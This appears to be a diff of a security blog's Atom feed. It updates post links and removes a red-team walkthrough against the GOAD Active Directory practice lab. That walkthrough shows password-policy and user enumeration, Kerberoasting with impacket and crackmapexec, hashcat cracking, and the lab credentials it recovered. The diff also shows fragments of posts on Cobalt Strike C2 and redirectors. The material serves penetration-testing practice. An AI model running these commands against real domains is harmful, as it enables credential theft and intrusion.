-<p><img src="/assets/images/sample/homelab/C2-profile/5.png" alt="5.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[Hide from blue team like a pro by using malleable c2 profiles.]]></summary></entry><entry><title type="html">Cobalt Strike Redirectors using Apache-SSL</title><link href="http://0.0.0.0:4000/red-team/redirectors/" rel="alternate" type="text/html" title="Cobalt Strike Redirectors using Apache-SSL" /><published>2024-12-19T00:00:00+00:00</published><updated>2024-12-19T00:00:00+00:00</updated><id>http://0.0.0.0:4000/red-team/redirectors</id><content type="html" xml:base="http://0.0.0.0:4000/red-team/redirectors/"><![CDATA[<h1 id="overview">Overview</h1>
+<p><img src="/assets/images/sample/homelab/C2-profile/5.png" alt="5.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[Hide from blue team like a pro by using malleable c2 profiles.]]></summary></entry><entry><title type="html">Cobalt Strike Redirectors using Apache-SSL</title><link href="https://dcodezero.github.io//red-team/redirectors/" rel="alternate" type="text/html" title="Cobalt Strike Redirectors using Apache-SSL" /><published>2024-12-19T00:00:00+00:00</published><updated>2024-12-19T00:00:00+00:00</updated><id>https://dcodezero.github.io//red-team/redirectors</id><content type="html" xml:base="https://dcodezero.github.io//red-team/redirectors/"><![CDATA[<h1 id="overview">Overview</h1>
 
 <p>Redirectors are systems designed to proxy traffic from a target network to private attack infrastructure. They play a vital role in ensuring operational security and serve several key purposes:</p>
 
@@ -4021,154 +4221,4 @@ Verifying - Enter Export Password:
 
 <p>The Cobalt Strike Team Server expects the KeyStore to be in the same directory as itself.  Launch the Team Server with the updated profile.</p>
 
-<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserver: ./teamserver IP-address passwword@123 apt.profile</code></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL]]></summary></entry><entry><title type="html">Game of Active Directory - Part 3 [Recon]</title><link href="http://0.0.0.0:4000/goad/GOAD-p3/" rel="alternate" type="text/html" title="Game of Active Directory - Part 3 [Recon]" /><published>2024-12-14T00:00:00+00:00</published><updated>2024-12-14T00:00:00+00:00</updated><id>http://0.0.0.0:4000/goad/GOAD-p3</id><content type="html" xml:base="http://0.0.0.0:4000/goad/GOAD-p3/"><![CDATA[<h4 id="previously">Previously:</h4>
-<p>Found two user names and passwords for the users, <code class="language-plaintext highlighter-rouge">Samwell.tarly</code> and <code class="language-plaintext highlighter-rouge">Brandon.stark</code>.</p>
-
-<p>Note: A good thing to note in here is to not use any password spraying as there is a high 
-chance of blocking the users. Its always a good practice to look at the password policy of the domain.</p>
-
-<p><code class="language-plaintext highlighter-rouge">crackmapexec smb winterfell --pass-pol</code>
-or
-<code class="language-plaintext highlighter-rouge">netexec smb winterfell --pass-pol</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# netexec smb winterfell --pass-pol
-SMB         172.16.100.51   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
-SMB         172.16.100.51   445    WINTERFELL       [+] Dumping password info for domain: NORTH
-SMB         172.16.100.51   445    WINTERFELL       Minimum password length: 5
-SMB         172.16.100.51   445    WINTERFELL       Password history length: 24
-SMB         172.16.100.51   445    WINTERFELL       Maximum password age: 311 days 2 minutes 
-SMB         172.16.100.51   445    WINTERFELL       
-SMB         172.16.100.51   445    WINTERFELL       Password Complexity Flags: 000000
-SMB         172.16.100.51   445    WINTERFELL           Domain Refuse Password Change: 0
-SMB         172.16.100.51   445    WINTERFELL           Domain Password Store Cleartext: 0
-SMB         172.16.100.51   445    WINTERFELL           Domain Password Lockout Admins: 0
-SMB         172.16.100.51   445    WINTERFELL           Domain Password No Clear Change: 0
-SMB         172.16.100.51   445    WINTERFELL           Domain Password No Anon Change: 0
-SMB         172.16.100.51   445    WINTERFELL           Domain Password Complex: 0
-SMB         172.16.100.51   445    WINTERFELL       
-SMB         172.16.100.51   445    WINTERFELL       Minimum password age: 1 day 4 minutes 
-SMB         172.16.100.51   445    WINTERFELL       Reset Account Lockout Counter: 5 minutes 
-SMB         172.16.100.51   445    WINTERFELL       Locked Account Duration: 5 minutes 
-SMB         172.16.100.51   445    WINTERFELL       Account Lockout Threshold: 5
-SMB         172.16.100.51   445    WINTERFELL       Forced Log off Time: Not Set
-</code></pre></div></div>
-
-<p>From above we can see that the password policy says if we <strong>fail 5 times in 5 minutes</strong> we lock the accounts for 5 minutes.</p>
-
-<p>From here there are two ways to check for the other attacks.
-<code class="language-plaintext highlighter-rouge">1. Kerberoasting</code>
-<code class="language-plaintext highlighter-rouge">2. Check for possible RDP to Winterfell using the gained creds</code>
-<code class="language-plaintext highlighter-rouge">3. Drop in sharphound to check for other cool stuff</code></p>
-
-<h2 id="we-shall-start-with-finding-more-users-in-the-domains">We shall start with finding more users in the domain/s</h2>
-
-<p>As we’ve found some users lets see, if we can find more users in the domain/s and see what can we get from those creds.</p>
-
-<table>
-  <tbody>
-    <tr>
-      <td>From MayFly’s blogs:</td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>When you get an account on an active directory, the first thing to do is always getting the full list of users.</li>
-  <li>Once you get it you could do a password spray on the full user list (very often you will find other accounts with weak password like username=password, SeasonYear!, SocietynameYear! or even 123456).</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
-[*] Querying north.sevenkingdoms.local for information about domain.
-Name                  Email                           PasswordLastSet      LastLogon           
---------------------  ------------------------------  -------------------  -------------------
-Administrator                                         2022-06-29 00:32:20.901897  2022-07-01 17:48:41.983605 
-Guest                                                 &lt;never&gt;              &lt;never&gt;             
-vagrant                                               2021-05-12 13:38:55.922520  2022-07-01 12:08:35.223885 
-krbtgt                                                2022-06-29 00:48:58.950440  &lt;never&gt;             
-arya.stark                                            2022-06-29 07:48:08.060667  2022-07-03 17:40:06.721358 
-eddard.stark                                          2022-06-29 07:48:11.560625  2022-07-04 23:33:27.976702 
-catelyn.stark                                         2022-06-29 07:48:15.013735  &lt;never&gt;             
-robb.stark                                            2022-06-29 07:48:18.544972  2022-07-04 23:35:50.678794 
-sansa.stark                                           2022-06-29 07:48:21.607059  &lt;never&gt;             
-brandon.stark                                         2022-06-29 07:48:24.278459  2022-07-04 23:36:08.991489 
-rickon.stark                                          2022-06-29 07:48:26.966809  &lt;never&gt;             
-hodor                                                 2022-06-29 07:48:29.670052  2022-07-04 23:21:58.774078 
-jon.snow                                              2022-06-29 07:48:32.373101  2022-07-03 17:36:26.798060 
-samwell.tarly                                         2022-06-29 07:48:35.107476  2022-07-01 16:35:17.043960 
-jeor.mormont                                          2022-06-29 07:48:37.841846  &lt;never&gt;             
-sql_svc                                               2022-06-29 07:48:40.248028  2022-07-03 15:56:57.924607
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>With ldap query, i recommend this article with all the useful ldap query for active directory : <a href="https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/">https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/</a></p>
-  </li>
-  <li>
-    <p>With ldap on north.sevenkingdoms.local</p>
-  </li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -H ldap://172.16.100.51 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&amp;(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>With ldap query we can request users of the others domain because a trust is present.</p>
-  </li>
-  <li>
-    <p>On essos.local</p>
-  </li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -H ldap://172.16.100.52 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&amp;(objectCategory=person)(objectClass=user))"
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -H ldap://172.16.100.50 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&amp;(objectCategory=person)(objectClass=user))"
-</code></pre></div></div>
-
-<h2 id="kerberoasting">Kerberoasting</h2>
-
-<ul>
-  <li>
-    <p>On an active directory, we will see very often users with an SPN set.</p>
-  </li>
-  <li>
-    <p>let’s find them with impacket</p>
-  </li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
----------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
-CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2022-06-29 07:48:32.373101  2022-06-29 10:34:54.308171  constrained 
-HTTP/thewall.north.sevenkingdoms.local               jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2022-06-29 07:48:32.373101  2022-06-29 10:34:54.308171  constrained 
-MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                               2022-06-29 07:48:40.248028  2022-06-29 22:54:57.422114              
-MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2022-06-29 07:48:40.248028  2022-06-29 22:54:57.422114
-</code></pre></div></div>
-
-<p>All the hashes will be stored in the file named kerberoasting.hashes</p>
-
-<ul>
-  <li>we could also do that with cme with the following command</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
-</code></pre></div></div>
-
-<ul>
-  <li>Now let’s try to crack the hashes</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
-</code></pre></div></div>
-
-<p>Creds Found:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user : north/jon.snow:iknownothing
-</code></pre></div></div>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD" /><category term="HomeLab" /><category term="Active-Drirectory" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry></feed>
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserver: ./teamserver IP-address passwword@123 apt.profile</code></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL]]></summary></entry></feed>
